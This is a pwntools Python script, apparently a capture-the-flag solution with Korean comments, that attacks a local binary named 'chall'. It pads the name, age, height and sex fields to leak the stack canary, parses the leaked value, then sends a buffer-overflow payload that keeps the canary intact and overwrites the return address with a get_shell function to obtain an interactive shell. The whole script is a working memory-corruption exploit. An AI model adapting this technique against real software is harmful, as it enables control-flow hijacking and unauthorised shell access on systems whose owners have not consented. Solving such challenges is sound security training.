#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'

p = process("./chall")
# p = remote("IP", PORT)
e = ELF("./chall")

# name
p.sendafter(b"Enter name: ", b'A' * 56)

# age (p64가 아닌 문자열 직접 입력)
p.sendlineafter(b"Enter age: ", b"1094795585")

# height (p64가 아닌 문자열 직접 입력)
p.sendlineafter(b"Enter height: ", b"-1.4398141315809794e-299")

# male_or_female
p.sendafter(b"Enter M (Male) or F (Female): ", b"ABCDE")

# canary leak
p.recvuntil(b"Hi ")
p.recv(0x38 + 0x8 + 0x9) # name + height + age + male_or_female + 1

canary_leaked = u64(b'\x00' + p.recv(7))
print(f"{hex(canary_leaked)=}")

# buffer overflow
get_shell = 0x401216 # NO PIE 이므로 디스어셈블을 통해 주소를 구할 수 있다.

payload = b'A' * 0x68 + p64(canary_leaked) + p64(0xDEADBEEF) + p64(get_shell)
p.sendlineafter(b"? ", payload)

p.interactive()